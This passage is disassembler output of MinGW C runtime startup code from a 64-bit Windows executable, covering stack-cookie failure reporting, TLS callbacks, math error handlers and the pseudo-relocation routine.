  4070b3:	5b                   	pop    %rbx
  4070b4:	5e                   	pop    %rsi
  4070b5:	5f                   	pop    %rdi
  4070b6:	5d                   	pop    %rbp
  4070b7:	41 5c                	pop    %r12
  4070b9:	c3                   	ret
  4070ba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4070c0:	48 ba cc 5d 20 d2 66 	movabs $0xffffd466d2205dcc,%rdx
  4070c7:	d4 ff ff 
  4070ca:	48 b8 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rax
  4070d1:	2b 00 00 
  4070d4:	eb cb                	jmp    4070a1 <__security_init_cookie+0xa1>
  4070d6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4070dd:	00 00 00 

00000000004070e0 <__report_gsfailure>:
  4070e0:	55                   	push   %rbp
  4070e1:	56                   	push   %rsi
  4070e2:	53                   	push   %rbx
  4070e3:	48 89 e5             	mov    %rsp,%rbp
  4070e6:	48 83 ec 70          	sub    $0x70,%rsp
  4070ea:	48 89 ce             	mov    %rcx,%rsi
  4070ed:	48 8d 0d 6c 71 02 00 	lea    0x2716c(%rip),%rcx        # 42e260 <GS_ContextRecord>
  4070f4:	ff 15 e2 11 04 00    	call   *0x411e2(%rip)        # 4482dc <__imp_RtlCaptureContext>
  4070fa:	48 8b 1d 57 72 02 00 	mov    0x27257(%rip),%rbx        # 42e358 <GS_ContextRecord+0xf8>
  407101:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
  407105:	45 31 c0             	xor    %r8d,%r8d
  407108:	48 89 d9             	mov    %rbx,%rcx
  40710b:	ff 15 d3 11 04 00    	call   *0x411d3(%rip)        # 4482e4 <__imp_RtlLookupFunctionEntry>
  407111:	48 85 c0             	test   %rax,%rax
  407114:	0f 84 a3 00 00 00    	je     4071bd <__report_gsfailure+0xdd>
  40711a:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
  40711e:	49 89 c1             	mov    %rax,%r9
  407121:	49 89 d8             	mov    %rbx,%r8
  407124:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
  40712b:	00 00 
  40712d:	48 8d 0d 2c 71 02 00 	lea    0x2712c(%rip),%rcx        # 42e260 <GS_ContextRecord>
  407134:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
  407139:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
  40713d:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
  407142:	31 c9                	xor    %ecx,%ecx
  407144:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
  407149:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  40714d:	ff 15 99 11 04 00    	call   *0x41199(%rip)        # 4482ec <__imp_RtlVirtualUnwind>
  407153:	48 8b 05 fe 71 02 00 	mov    0x271fe(%rip),%rax        # 42e358 <GS_ContextRecord+0xf8>
  40715a:	31 c9                	xor    %ecx,%ecx
  40715c:	48 89 35 7d 71 02 00 	mov    %rsi,0x2717d(%rip)        # 42e2e0 <GS_ContextRecord+0x80>
  407163:	48 89 05 e6 75 02 00 	mov    %rax,0x275e6(%rip)        # 42e750 <GS_ExceptionRecord+0x10>
  40716a:	48 b8 09 04 00 c0 01 	movabs $0x1c0000409,%rax
  407171:	00 00 00 
  407174:	48 89 05 c5 75 02 00 	mov    %rax,0x275c5(%rip)        # 42e740 <GS_ExceptionRecord>
  40717b:	48 8b 05 be 3f 00 00 	mov    0x3fbe(%rip),%rax        # 40b140 <__security_cookie>
  407182:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  407186:	48 8b 05 c3 3f 00 00 	mov    0x3fc3(%rip),%rax        # 40b150 <__security_cookie_complement>
  40718d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  407191:	ff 15 65 11 04 00    	call   *0x41165(%rip)        # 4482fc <__imp_SetUnhandledExceptionFilter>
  407197:	48 8d 0d 22 a8 00 00 	lea    0xa822(%rip),%rcx        # 4119c0 <GS_ExceptionPointers>
  40719e:	ff 15 90 11 04 00    	call   *0x41190(%rip)        # 448334 <__imp_UnhandledExceptionFilter>
  4071a4:	ff 15 ca 10 04 00    	call   *0x410ca(%rip)        # 448274 <__imp_GetCurrentProcess>
  4071aa:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
  4071af:	48 89 c1             	mov    %rax,%rcx
  4071b2:	ff 15 54 11 04 00    	call   *0x41154(%rip)        # 44830c <__imp_TerminateProcess>
  4071b8:	e8 93 12 00 00       	call   408450 <abort>
  4071bd:	48 8b 45 18          	mov    0x18(%rbp),%rax
  4071c1:	48 89 05 90 71 02 00 	mov    %rax,0x27190(%rip)        # 42e358 <GS_ContextRecord+0xf8>
  4071c8:	48 8d 45 08          	lea    0x8(%rbp),%rax
  4071cc:	48 89 05 25 71 02 00 	mov    %rax,0x27125(%rip)        # 42e2f8 <GS_ContextRecord+0x98>
  4071d3:	e9 7b ff ff ff       	jmp    407153 <__report_gsfailure+0x73>
  4071d8:	90                   	nop
  4071d9:	90                   	nop
  4071da:	90                   	nop
  4071db:	90                   	nop
  4071dc:	90                   	nop
  4071dd:	90                   	nop
  4071de:	90                   	nop
  4071df:	90                   	nop

00000000004071e0 <__dyn_tls_dtor>:
  4071e0:	48 83 ec 28          	sub    $0x28,%rsp
  4071e4:	83 fa 03             	cmp    $0x3,%edx
  4071e7:	74 17                	je     407200 <__dyn_tls_dtor+0x20>
  4071e9:	85 d2                	test   %edx,%edx
  4071eb:	74 13                	je     407200 <__dyn_tls_dtor+0x20>
  4071ed:	b8 01 00 00 00       	mov    $0x1,%eax
  4071f2:	48 83 c4 28          	add    $0x28,%rsp
  4071f6:	c3                   	ret
  4071f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4071fe:	00 00 
  407200:	e8 cb 0c 00 00       	call   407ed0 <__mingw_TLScallback>
  407205:	b8 01 00 00 00       	mov    $0x1,%eax
  40720a:	48 83 c4 28          	add    $0x28,%rsp
  40720e:	c3                   	ret
  40720f:	90                   	nop

0000000000407210 <__dyn_tls_init>:
  407210:	56                   	push   %rsi
  407211:	53                   	push   %rbx
  407212:	48 83 ec 28          	sub    $0x28,%rsp
  407216:	48 8b 05 83 aa 00 00 	mov    0xaa83(%rip),%rax        # 411ca0 <.refptr._CRT_MT>
  40721d:	83 38 02             	cmpl   $0x2,(%rax)
  407220:	74 06                	je     407228 <__dyn_tls_init+0x18>
  407222:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
  407228:	83 fa 02             	cmp    $0x2,%edx
  40722b:	74 13                	je     407240 <__dyn_tls_init+0x30>
  40722d:	83 fa 01             	cmp    $0x1,%edx
  407230:	74 40                	je     407272 <__dyn_tls_init+0x62>
  407232:	b8 01 00 00 00       	mov    $0x1,%eax
  407237:	48 83 c4 28          	add    $0x28,%rsp
  40723b:	5b                   	pop    %rbx
  40723c:	5e                   	pop    %rsi
  40723d:	c3                   	ret
  40723e:	66 90                	xchg   %ax,%ax
  407240:	48 8d 1d 19 1e 04 00 	lea    0x41e19(%rip),%rbx        # 449060 <__xd_z>
  407247:	48 8d 35 12 1e 04 00 	lea    0x41e12(%rip),%rsi        # 449060 <__xd_z>
  40724e:	48 39 de             	cmp    %rbx,%rsi
  407251:	74 df                	je     407232 <__dyn_tls_init+0x22>
  407253:	48 8b 03             	mov    (%rbx),%rax
  407256:	48 85 c0             	test   %rax,%rax
  407259:	74 02                	je     40725d <__dyn_tls_init+0x4d>
  40725b:	ff d0                	call   *%rax
  40725d:	48 83 c3 08          	add    $0x8,%rbx
  407261:	48 39 de             	cmp    %rbx,%rsi
  407264:	75 ed                	jne    407253 <__dyn_tls_init+0x43>
  407266:	b8 01 00 00 00       	mov    $0x1,%eax
  40726b:	48 83 c4 28          	add    $0x28,%rsp
  40726f:	5b                   	pop    %rbx
  407270:	5e                   	pop    %rsi
  407271:	c3                   	ret
  407272:	e8 59 0c 00 00       	call   407ed0 <__mingw_TLScallback>
  407277:	b8 01 00 00 00       	mov    $0x1,%eax
  40727c:	48 83 c4 28          	add    $0x28,%rsp
  407280:	5b                   	pop    %rbx
  407281:	5e                   	pop    %rsi
  407282:	c3                   	ret
  407283:	0f 1f 00             	nopl   (%rax)
  407286:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40728d:	00 00 00 

0000000000407290 <__tlregdtor>:
  407290:	31 c0                	xor    %eax,%eax
  407292:	c3                   	ret
  407293:	90                   	nop
  407294:	90                   	nop
  407295:	90                   	nop
  407296:	90                   	nop
  407297:	90                   	nop
  407298:	90                   	nop
  407299:	90                   	nop
  40729a:	90                   	nop
  40729b:	90                   	nop
  40729c:	90                   	nop
  40729d:	90                   	nop
  40729e:	90                   	nop
  40729f:	90                   	nop

00000000004072a0 <__mingw_raise_matherr>:
  4072a0:	48 83 ec 58          	sub    $0x58,%rsp
  4072a4:	48 8b 05 55 75 02 00 	mov    0x27555(%rip),%rax        # 42e800 <stUserMathErr>
  4072ab:	48 85 c0             	test   %rax,%rax
  4072ae:	74 2c                	je     4072dc <__mingw_raise_matherr+0x3c>
  4072b0:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
  4072b7:	00 00 
  4072b9:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
  4072bd:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  4072c2:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
  4072c7:	f2 0f 11 54 24 30    	movsd  %xmm2,0x30(%rsp)
  4072cd:	f2 0f 11 5c 24 38    	movsd  %xmm3,0x38(%rsp)
  4072d3:	f2 0f 11 44 24 40    	movsd  %xmm0,0x40(%rsp)
  4072d9:	ff d0                	call   *%rax
  4072db:	90                   	nop
  4072dc:	48 83 c4 58          	add    $0x58,%rsp
  4072e0:	c3                   	ret
  4072e1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4072e6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4072ed:	00 00 00 

00000000004072f0 <__mingw_setusermatherr>:
  4072f0:	48 89 0d 09 75 02 00 	mov    %rcx,0x27509(%rip)        # 42e800 <stUserMathErr>
  4072f7:	e9 94 11 00 00       	jmp    408490 <__setusermatherr>
  4072fc:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000407300 <_matherr>:
  407300:	56                   	push   %rsi
  407301:	53                   	push   %rbx
  407302:	48 83 ec 78          	sub    $0x78,%rsp
  407306:	0f 29 74 24 40       	movaps %xmm6,0x40(%rsp)
  40730b:	0f 29 7c 24 50       	movaps %xmm7,0x50(%rsp)
  407310:	44 0f 29 44 24 60    	movaps %xmm8,0x60(%rsp)
  407316:	83 39 06             	cmpl   $0x6,(%rcx)
  407319:	0f 87 d1 00 00 00    	ja     4073f0 <_matherr+0xf0>
  40731f:	8b 01                	mov    (%rcx),%eax
  407321:	48 8d 15 3c a8 00 00 	lea    0xa83c(%rip),%rdx        # 411b64 <.rdata+0x124>
  407328:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
  40732c:	48 01 d0             	add    %rdx,%rax
  40732f:	ff e0                	jmp    *%rax
  407331:	48 8d 1d 08 a7 00 00 	lea    0xa708(%rip),%rbx        # 411a40 <.rdata>
  407338:	48 8b 71 08          	mov    0x8(%rcx),%rsi
  40733c:	f2 44 0f 10 41 20    	movsd  0x20(%rcx),%xmm8
  407342:	f2 0f 10 79 18       	movsd  0x18(%rcx),%xmm7
  407347:	f2 0f 10 71 10       	movsd  0x10(%rcx),%xmm6
  40734c:	b9 02 00 00 00       	mov    $0x2,%ecx
  407351:	e8 6a 11 00 00       	call   4084c0 <__acrt_iob_func>
  407356:	f2 44 0f 11 44 24 30 	movsd  %xmm8,0x30(%rsp)
  40735d:	49 89 f1             	mov    %rsi,%r9
  407360:	49 89 d8             	mov    %rbx,%r8
  407363:	f2 0f 11 7c 24 28    	movsd  %xmm7,0x28(%rsp)
  407369:	48 8d 15 c8 a7 00 00 	lea    0xa7c8(%rip),%rdx        # 411b38 <.rdata+0xf8>
  407370:	48 89 c1             	mov    %rax,%rcx
  407373:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
  407379:	e8 b2 10 00 00       	call   408430 <fprintf>
  40737e:	90                   	nop
  40737f:	0f 28 74 24 40       	movaps 0x40(%rsp),%xmm6
  407384:	31 c0                	xor    %eax,%eax
  407386:	0f 28 7c 24 50       	movaps 0x50(%rsp),%xmm7
  40738b:	44 0f 28 44 24 60    	movaps 0x60(%rsp),%xmm8
  407391:	48 83 c4 78          	add    $0x78,%rsp
  407395:	5b                   	pop    %rbx
  407396:	5e                   	pop    %rsi
  407397:	c3                   	ret
  407398:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40739f:	00 
  4073a0:	48 8d 1d b8 a6 00 00 	lea    0xa6b8(%rip),%rbx        # 411a5f <.rdata+0x1f>
  4073a7:	eb 8f                	jmp    407338 <_matherr+0x38>
  4073a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4073b0:	48 8d 1d c9 a6 00 00 	lea    0xa6c9(%rip),%rbx        # 411a80 <.rdata+0x40>
  4073b7:	e9 7c ff ff ff       	jmp    407338 <_matherr+0x38>
  4073bc:	0f 1f 40 00          	nopl   0x0(%rax)
  4073c0:	48 8d 1d 29 a7 00 00 	lea    0xa729(%rip),%rbx        # 411af0 <.rdata+0xb0>
  4073c7:	e9 6c ff ff ff       	jmp    407338 <_matherr+0x38>
  4073cc:	0f 1f 40 00          	nopl   0x0(%rax)
  4073d0:	48 8d 1d f1 a6 00 00 	lea    0xa6f1(%rip),%rbx        # 411ac8 <.rdata+0x88>
  4073d7:	e9 5c ff ff ff       	jmp    407338 <_matherr+0x38>
  4073dc:	0f 1f 40 00          	nopl   0x0(%rax)
  4073e0:	48 8d 1d b9 a6 00 00 	lea    0xa6b9(%rip),%rbx        # 411aa0 <.rdata+0x60>
  4073e7:	e9 4c ff ff ff       	jmp    407338 <_matherr+0x38>
  4073ec:	0f 1f 40 00          	nopl   0x0(%rax)
  4073f0:	48 8d 1d 2f a7 00 00 	lea    0xa72f(%rip),%rbx        # 411b26 <.rdata+0xe6>
  4073f7:	e9 3c ff ff ff       	jmp    407338 <_matherr+0x38>
  4073fc:	90                   	nop
  4073fd:	90                   	nop
  4073fe:	90                   	nop
  4073ff:	90                   	nop

0000000000407400 <_fpreset>:
  407400:	db e3                	fninit
  407402:	c3                   	ret
  407403:	90                   	nop
  407404:	90                   	nop
  407405:	90                   	nop
  407406:	90                   	nop
  407407:	90                   	nop
  407408:	90                   	nop
  407409:	90                   	nop
  40740a:	90                   	nop
  40740b:	90                   	nop
  40740c:	90                   	nop
  40740d:	90                   	nop
  40740e:	90                   	nop
  40740f:	90                   	nop

0000000000407410 <_decode_pointer>:
  407410:	48 89 c8             	mov    %rcx,%rax
  407413:	c3                   	ret
  407414:	66 90                	xchg   %ax,%ax
  407416:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40741d:	00 00 00 

0000000000407420 <_encode_pointer>:
  407420:	48 89 c8             	mov    %rcx,%rax
  407423:	c3                   	ret
  407424:	90                   	nop
  407425:	90                   	nop
  407426:	90                   	nop
  407427:	90                   	nop
  407428:	90                   	nop
  407429:	90                   	nop
  40742a:	90                   	nop
  40742b:	90                   	nop
  40742c:	90                   	nop
  40742d:	90                   	nop
  40742e:	90                   	nop
  40742f:	90                   	nop

0000000000407430 <__write_memory.part.0>:
  407430:	41 54                	push   %r12
  407432:	55                   	push   %rbp
  407433:	57                   	push   %rdi
  407434:	56                   	push   %rsi
  407435:	53                   	push   %rbx
  407436:	48 83 ec 50          	sub    $0x50,%rsp
  40743a:	48 63 35 e3 73 02 00 	movslq 0x273e3(%rip),%rsi        # 42e824 <maxSections>
  407441:	85 f6                	test   %esi,%esi
  407443:	48 89 cb             	mov    %rcx,%rbx
  407446:	48 89 d5             	mov    %rdx,%rbp
  407449:	4c 89 c7             	mov    %r8,%rdi
  40744c:	0f 8e 66 01 00 00    	jle    4075b8 <__write_memory.part.0+0x188>
  407452:	48 8b 05 cf 73 02 00 	mov    0x273cf(%rip),%rax        # 42e828 <the_secs>
  407459:	31 c9                	xor    %ecx,%ecx
  40745b:	48 83 c0 18          	add    $0x18,%rax
  40745f:	90                   	nop
  407460:	48 8b 10             	mov    (%rax),%rdx
  407463:	48 39 d3             	cmp    %rdx,%rbx
  407466:	72 14                	jb     40747c <__write_memory.part.0+0x4c>
  407468:	4c 8b 40 08          	mov    0x8(%rax),%r8
  40746c:	45 8b 40 08          	mov    0x8(%r8),%r8d
  407470:	4c 01 c2             	add    %r8,%rdx
  407473:	48 39 d3             	cmp    %rdx,%rbx
  407476:	0f 82 89 00 00 00    	jb     407505 <__write_memory.part.0+0xd5>
  40747c:	83 c1 01             	add    $0x1,%ecx
  40747f:	48 83 c0 28          	add    $0x28,%rax
  407483:	39 f1                	cmp    %esi,%ecx
  407485:	75 d9                	jne    407460 <__write_memory.part.0+0x30>
  407487:	48 89 d9             	mov    %rbx,%rcx
  40748a:	e8 41 0c 00 00       	call   4080d0 <__mingw_GetSectionForAddress>
  40748f:	48 85 c0             	test   %rax,%rax
  407492:	49 89 c4             	mov    %rax,%r12
  407495:	0f 84 52 01 00 00    	je     4075ed <__write_memory.part.0+0x1bd>
  40749b:	48 8b 05 86 73 02 00 	mov    0x27386(%rip),%rax        # 42e828 <the_secs>
  4074a2:	48 8d 34 b6          	lea    (%rsi,%rsi,4),%rsi
  4074a6:	48 c1 e6 03          	shl    $0x3,%rsi
  4074aa:	48 01 f0             	add    %rsi,%rax
  4074ad:	4c 89 60 20          	mov    %r12,0x20(%rax)
  4074b1:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
  4074b7:	e8 44 0d 00 00       	call   408200 <_GetPEImageBase>
  4074bc:	41 8b 4c 24 0c       	mov    0xc(%r12),%ecx
  4074c1:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
  4074c6:	41 b8 30 00 00 00    	mov    $0x30,%r8d
  4074cc:	48 01 c1             	add    %rax,%rcx
  4074cf:	48 8b 05 52 73 02 00 	mov    0x27352(%rip),%rax        # 42e828 <the_secs>
  4074d6:	48 89 4c 30 18       	mov    %rcx,0x18(%rax,%rsi,1)
  4074db:	ff 15 73 0e 04 00    	call   *0x40e73(%rip)        # 448354 <__imp_VirtualQuery>
  4074e1:	48 85 c0             	test   %rax,%rax
  4074e4:	0f 84 e6 00 00 00    	je     4075d0 <__write_memory.part.0+0x1a0>
  4074ea:	8b 44 24 44          	mov    0x44(%rsp),%eax
  4074ee:	8d 50 fc             	lea    -0x4(%rax),%edx
  4074f1:	83 e2 fb             	and    $0xfffffffb,%edx
  4074f4:	74 08                	je     4074fe <__write_memory.part.0+0xce>
  4074f6:	83 e8 40             	sub    $0x40,%eax
  4074f9:	83 e0 bf             	and    $0xffffffbf,%eax
  4074fc:	75 62                	jne    407560 <__write_memory.part.0+0x130>
  4074fe:	83 05 1f 73 02 00 01 	addl   $0x1,0x2731f(%rip)        # 42e824 <maxSections>
  407505:	83 ff 08             	cmp    $0x8,%edi
  407508:	73 29                	jae    407533 <__write_memory.part.0+0x103>
  40750a:	40 f6 c7 04          	test   $0x4,%dil
  40750e:	0f 85 90 00 00 00    	jne    4075a4 <__write_memory.part.0+0x174>
  407514:	85 ff                	test   %edi,%edi
  407516:	74 10                	je     407528 <__write_memory.part.0+0xf8>
  407518:	0f b6 45 00          	movzbl 0x0(%rbp),%eax
  40751c:	40 f6 c7 02          	test   $0x2,%dil
  407520:	88 03                	mov    %al,(%rbx)
  407522:	0f 85 97 00 00 00    	jne    4075bf <__write_memory.part.0+0x18f>
  407528:	48 83 c4 50          	add    $0x50,%rsp
  40752c:	5b                   	pop    %rbx
  40752d:	5e                   	pop    %rsi
  40752e:	5f                   	pop    %rdi
  40752f:	5d                   	pop    %rbp
  407530:	41 5c                	pop    %r12
  407532:	c3                   	ret
  407533:	89 f8                	mov    %edi,%eax
  407535:	83 ef 01             	sub    $0x1,%edi
  407538:	48 8b 54 05 f8       	mov    -0x8(%rbp,%rax,1),%rdx
  40753d:	83 ff 08             	cmp    $0x8,%edi
  407540:	48 89 54 03 f8       	mov    %rdx,-0x8(%rbx,%rax,1)
  407545:	72 e1                	jb     407528 <__write_memory.part.0+0xf8>
  407547:	83 e7 f8             	and    $0xfffffff8,%edi
  40754a:	31 c0                	xor    %eax,%eax
  40754c:	89 c2                	mov    %eax,%edx
  40754e:	83 c0 08             	add    $0x8,%eax
  407551:	48 8b 4c 15 00       	mov    0x0(%rbp,%rdx,1),%rcx
  407556:	39 f8                	cmp    %edi,%eax
  407558:	48 89 0c 13          	mov    %rcx,(%rbx,%rdx,1)
  40755c:	72 ee                	jb     40754c <__write_memory.part.0+0x11c>
  40755e:	eb c8                	jmp    407528 <__write_memory.part.0+0xf8>
  407560:	48 03 35 c1 72 02 00 	add    0x272c1(%rip),%rsi        # 42e828 <the_secs>
  407567:	41 b8 40 00 00 00    	mov    $0x40,%r8d
  40756d:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
  407572:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
  407577:	49 89 f1             	mov    %rsi,%r9
  40757a:	48 89 4e 08          	mov    %rcx,0x8(%rsi)
  40757e:	48 89 56 10          	mov    %rdx,0x10(%rsi)
  407582:	ff 15 c4 0d 04 00    	call   *0x40dc4(%rip)        # 44834c <__imp_VirtualProtect>
  407588:	85 c0                	test   %eax,%eax
  40758a:	0f 85 6e ff ff ff    	jne    4074fe <__write_memory.part.0+0xce>
  407590:	ff 15 f6 0c 04 00    	call   *0x40cf6(%rip)        # 44828c <__imp_GetLastError>
  407596:	48 8d 0d 5b a6 00 00 	lea    0xa65b(%rip),%rcx        # 411bf8 <.rdata+0x78>
  40759d:	89 c2                	mov    %eax,%edx
  40759f:	e8 cc 2b 00 00       	call   40a170 <__report_error>
  4075a4:	8b 45 00             	mov    0x0(%rbp),%eax
  4075a7:	89 ff                	mov    %edi,%edi
  4075a9:	89 03                	mov    %eax,(%rbx)
  4075ab:	8b 44 3d fc          	mov    -0x4(%rbp,%rdi,1),%eax
  4075af:	89 44 3b fc          	mov    %eax,-0x4(%rbx,%rdi,1)
  4075b3:	e9 70 ff ff ff       	jmp    407528 <__write_memory.part.0+0xf8>
  4075b8:	31 f6                	xor    %esi,%esi
  4075ba:	e9 c8 fe ff ff       	jmp    407487 <__write_memory.part.0+0x57>
  4075bf:	89 ff                	mov    %edi,%edi
  4075c1:	0f b7 44 3d fe       	movzwl -0x2(%rbp,%rdi,1),%eax
  4075c6:	66 89 44 3b fe       	mov    %ax,-0x2(%rbx,%rdi,1)
  4075cb:	e9 58 ff ff ff       	jmp    407528 <__write_memory.part.0+0xf8>
  4075d0:	48 8b 05 51 72 02 00 	mov    0x27251(%rip),%rax        # 42e828 <the_secs>
  4075d7:	48 8d 0d e2 a5 00 00 	lea    0xa5e2(%rip),%rcx        # 411bc0 <.rdata+0x40>
  4075de:	41 8b 54 24 08       	mov    0x8(%r12),%edx
  4075e3:	4c 8b 44 30 18       	mov    0x18(%rax,%rsi,1),%r8
  4075e8:	e8 83 2b 00 00       	call   40a170 <__report_error>
  4075ed:	48 8d 0d ac a5 00 00 	lea    0xa5ac(%rip),%rcx        # 411ba0 <.rdata+0x20>
  4075f4:	48 89 da             	mov    %rbx,%rdx
  4075f7:	e8 74 2b 00 00       	call   40a170 <__report_error>
  4075fc:	90                   	nop
  4075fd:	0f 1f 00             	nopl   (%rax)

0000000000407600 <_pei386_runtime_relocator>:
  407600:	55                   	push   %rbp
  407601:	41 57                	push   %r15
  407603:	41 56                	push   %r14
  407605:	41 55                	push   %r13
  407607:	41 54                	push   %r12
  407609:	57                   	push   %rdi
  40760a:	56                   	push   %rsi
  40760b:	53                   	push   %rbx
  40760c:	48 83 ec 38          	sub    $0x38,%rsp
  407610:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
  407617:	00 
  407618:	8b 1d 02 72 02 00    	mov    0x27202(%rip),%ebx        # 42e820 <was_init.95174>
  40761e:	85 db                	test   %ebx,%ebx
  407620:	74 11                	je     407633 <_pei386_runtime_relocator+0x33>
  407622:	48 8d 65 b8          	lea    -0x48(%rbp),%rsp
  407626:	5b                   	pop    %rbx
  407627:	5e                   	pop    %rsi
  407628:	5f                   	pop    %rdi
  407629:	41 5c                	pop    %r12
  40762b:	41 5d                	pop    %r13
  40762d:	41 5e                	pop    %r14
  40762f:	41 5f                	pop    %r15
  407631:	5d                   	pop    %rbp
  407632:	c3                   	ret
  407633:	c7 05 e3 71 02 00 01 	movl   $0x1,0x271e3(%rip)        # 42e820 <was_init.95174>
  40763a:	00 00 00 
  40763d:	e8 0e 0b 00 00       	call   408150 <__mingw_GetSectionCount>
  407642:	48 98                	cltq
  407644:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  407648:	48 8d 04 c5 1e 00 00 	lea    0x1e(,%rax,8),%rax
  40764f:	00 
  407650:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
  407654:	e8 37 0d 00 00       	call   408390 <___chkstk_ms>
  407659:	4c 8b 25 70 a6 00 00 	mov    0xa670(%rip),%r12        # 411cd0 <.refptr.__RUNTIME_PSEUDO_RELOC_LIST_END__>
  407660:	c7 05 ba 71 02 00 00 	movl   $0x0,0x271ba(%rip)        # 42e824 <maxSections>
  407667:	00 00 00 
  40766a:	48 8b 35 6f a6 00 00 	mov    0xa66f(%rip),%rsi        # 411ce0 <.refptr.__RUNTIME_PSEUDO_RELOC_LIST__>
  407671:	48 29 c4             	sub    %rax,%rsp
  407674:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
  407679:	48 89 05 a8 71 02 00 	mov    %rax,0x271a8(%rip)        # 42e828 <the_secs>
  407680:	4c 89 e0             	mov    %r12,%rax
  407683:	48 29 f0             	sub    %rsi,%rax
  407686:	48 83 f8 07          	cmp    $0x7,%rax
  40768a:	7e 96                	jle    407622 <_pei386_runtime_relocator+0x22>
  40768c:	48 83 f8 0b          	cmp    $0xb,%rax
  407690:	8b 16                	mov    (%rsi),%edx
  407692:	0f 8e c8 00 00 00    	jle    407760 <_pei386_runtime_relocator+0x160>
  407698:	85 d2                	test   %edx,%edx
  40769a:	0f 84 a4 00 00 00    	je     407744 <_pei386_runtime_relocator+0x144>
  4076a0:	4c 39 e6             	cmp    %r12,%rsi
  4076a3:	0f 83 79 ff ff ff    	jae    407622 <_pei386_runtime_relocator+0x22>
  4076a9:	4c 8d 76 08          	lea    0x8(%rsi),%r14
  4076ad:	49 83 c4 07          	add    $0x7,%r12
  4076b1:	4c 8b 2d 48 a6 00 00 	mov    0xa648(%rip),%r13        # 411d00 <.refptr.__image_base__>
  4076b8:	48 8d 7d a8          	lea    -0x58(%rbp),%rdi
  4076bc:	4d 29 f4             	sub    %r14,%r12
  4076bf:	49 c1 ec 03          	shr    $0x3,%r12
  4076c3:	4e 8d 64 e6 08       	lea    0x8(%rsi,%r12,8),%r12
  4076c8:	eb 0a                	jmp    4076d4 <_pei386_runtime_relocator+0xd4>
  4076ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4076d0:	49 83 c6 08          	add    $0x8,%r14
  4076d4:	8b 4e 04             	mov    0x4(%rsi),%ecx
  4076d7:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  4076dd:	48 89 fa             	mov    %rdi,%rdx
  4076e0:	8b 06                	mov    (%rsi),%eax
  4076e2:	4c 89 f6             	mov    %r14,%rsi
  4076e5:	4c 01 e9             	add    %r13,%rcx
  4076e8:	03 01                	add    (%rcx),%eax
  4076ea:	89 45 a8             	mov    %eax,-0x58(%rbp)
  4076ed:	e8 3e fd ff ff       	call   407430 <__write_memory.part.0>
  4076f2:	4d 39 e6             	cmp    %r12,%r14
  4076f5:	75 d9                	jne    4076d0 <_pei386_runtime_relocator+0xd0>
  4076f7:	8b 05 27 71 02 00    	mov    0x27127(%rip),%eax        # 42e824 <maxSections>
  4076fd:	31 f6                	xor    %esi,%esi
  4076ff:	4c 8b 25 46 0c 04 00 	mov    0x40c46(%rip),%r12        # 44834c <__imp_VirtualProtect>
  407706:	85 c0                	test   %eax,%eax
  407708:	0f 8e 14 ff ff ff    	jle    407622 <_pei386_runtime_relocator+0x22>
  40770e:	66 90                	xchg   %ax,%ax
  407710:	48 8b 05 11 71 02 00 	mov    0x27111(%rip),%rax        # 42e828 <the_secs>
  407717:	48 01 f0             	add    %rsi,%rax
  40771a:	44 8b 00             	mov    (%rax),%r8d
  40771d:	45 85 c0             	test   %r8d,%r8d
  407720:	74 0e                	je     407730 <_pei386_runtime_relocator+0x130>
  407722:	48 8b 50 10          	mov    0x10(%rax),%rdx
  407726:	49 89 f9             	mov    %rdi,%r9
  407729:	48 8b 48 08          	mov    0x8(%rax),%rcx
  40772d:	41 ff d4             	call   *%r12
  407730:	83 c3 01             	add    $0x1,%ebx
  407733:	48 83 c6 28          	add    $0x28,%rsi
  407737:	3b 1d e7 70 02 00    	cmp    0x270e7(%rip),%ebx        # 42e824 <maxSections>
  40773d:	7c d1                	jl     407710 <_pei386_runtime_relocator+0x110>
  40773f:	e9 de fe ff ff       	jmp    407622 <_pei386_runtime_relocator+0x22>
  407744:	8b 4e 04             	mov    0x4(%rsi),%ecx
  407747:	85 c9                	test   %ecx,%ecx
  407749:	0f 85 51 ff ff ff    	jne    4076a0 <_pei386_runtime_relocator+0xa0>
  40774f:	8b 56 08             	mov    0x8(%rsi),%edx
  407752:	85 d2                	test   %edx,%edx
  407754:	75 1d                	jne    407773 <_pei386_runtime_relocator+0x173>
  407756:	8b 56 0c             	mov    0xc(%rsi),%edx
